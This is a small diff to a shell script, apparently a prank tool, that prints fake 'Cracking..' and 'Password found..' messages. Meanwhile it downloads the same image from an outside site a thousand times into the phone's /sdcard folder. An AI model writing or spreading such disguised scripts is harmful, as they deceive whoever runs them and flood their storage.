@@ -52,9 +52,9 @@ echo -e $i"["$w"*"$i"]"$w" Cracking.."
 sleep 10
 cd /sdcard
 
-for i in {1..1000}
+for x in {1..1000}
 do
- wget "https://pictr.com/images/2018/12/12/0wS6PP.jpg" -O hacked$i.jpg
+ wget "https://pictr.com/images/2018/12/12/0wS6PP.jpg" -O hacked$x.jpg
 
 done
 echo -e $i"["$w"√"$i"]"$w" Password found.."
